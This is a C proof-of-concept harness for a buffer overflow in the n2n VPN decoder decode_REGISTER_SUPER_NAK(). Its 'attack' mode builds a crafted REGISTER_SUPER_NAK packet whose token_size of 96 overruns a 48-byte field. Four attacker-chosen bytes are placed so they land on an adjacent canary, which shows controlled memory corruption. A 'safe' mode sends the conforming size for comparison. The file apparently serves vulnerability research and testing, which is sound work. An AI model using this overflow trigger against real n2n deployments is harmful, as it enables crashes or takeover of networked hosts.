/* n2n2shell harness: drives the verbatim pinned decode_REGISTER_SUPER_NAK().
 * MODE=attack sends wire token_size 96 into a 48-byte destination;
 * MODE=safe sends the conforming 48. ASan builds use a heap destination,
 * plain builds use a layout with an adjacent canary to show chosen bytes. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "types.h"

int decode_REGISTER_SUPER_NAK(n2n_REGISTER_SUPER_NAK_t *nak,
                              const n2n_common_t *cmn,
                              const uint8_t *base, size_t *rem, size_t *idx);

#define TOKEN_SIZE_ATTACK 96
#define CHOSEN0 0x48
#define CHOSEN1 0x5a
#define CHOSEN2 0x4d
#define CHOSEN3 0x49

struct plain_layout {
    n2n_REGISTER_SUPER_NAK_t nak;
    uint8_t canary[128];
};

int main(int argc, char **argv) {
    const char *mode = (argc > 1) ? argv[1] : "attack";
    int attack = (strcmp(mode, "attack") == 0);
    uint16_t wire_token_size = attack ? TOKEN_SIZE_ATTACK : N2N_AUTH_MAX_TOKEN_SIZE;
    size_t payload_len = wire_token_size;
    size_t pkt_len = 4 + N2N_MAC_SIZE + 2 + 2 + payload_len;
    uint8_t pkt[4 + N2N_MAC_SIZE + 2 + 2 + TOKEN_SIZE_ATTACK];
    size_t idx = 0, rem = pkt_len, i;
    n2n_common_t cmn;
    int rc;
    uint8_t *canary = NULL;
    n2n_REGISTER_SUPER_NAK_t *nak;

    memset(&cmn, 0, sizeof(cmn));
    memset(pkt, 0, sizeof(pkt));

    /* Wire REGISTER_SUPER_NAK field order: cookie, srcMac, scheme,
     * token_size, token[token_size]. */
    pkt[3] = 0x44;                    /* cookie low byte */
    for(i = 0; i < N2N_MAC_SIZE; i++)
        pkt[4 + i] = (uint8_t)(0xa0 + i);
    pkt[10] = 0x00; pkt[11] = 0x01;  /* scheme = n2n_auth_simple_id */
    pkt[12] = (uint8_t)(wire_token_size >> 8);
    pkt[13] = (uint8_t)(wire_token_size & 0xff);
    for(i = 0; i < payload_len; i++)
        pkt[14 + i] = (i < 50) ? 0x41 : (uint8_t)(0x41 + (i % 26));
    /* Chosen four bytes: token offsets 50..53 land on canary[0..3]
     * in the plain layout (token ends at struct offset 62, canary at 64). */
    pkt[14 + 50] = CHOSEN0;
    pkt[14 + 51] = CHOSEN1;
    pkt[14 + 52] = CHOSEN2;
    pkt[14 + 53] = CHOSEN3;

#ifdef ASAN_BUILD
    nak = (n2n_REGISTER_SUPER_NAK_t *)malloc(sizeof(*nak));
    if(!nak) return 2;
    memset(nak, 0xab, sizeof(*nak));
#else
    {
        static struct plain_layout layout;
        memset(&layout, 0xab, sizeof(layout));
        nak = &layout.nak;
        canary = layout.canary;
    }
#endif

    rc = decode_REGISTER_SUPER_NAK(nak, &cmn, pkt, &rem, &idx);
    printf("MODE=%s RET=%d WIRE_TOKEN_SIZE=%u IDX=%zu REM=%zu\n",
           mode, rc, (unsigned)wire_token_size, idx, rem);
    if(canary) {
        printf("CANARY=%02x%02x%02x%02x EXPECT=%02x%02x%02x%02x\n",
               canary[0], canary[1], canary[2], canary[3],
               CHOSEN0, CHOSEN1, CHOSEN2, CHOSEN3);
    }
#ifdef ASAN_BUILD
    free(nak);
#endif
    return 0;
}
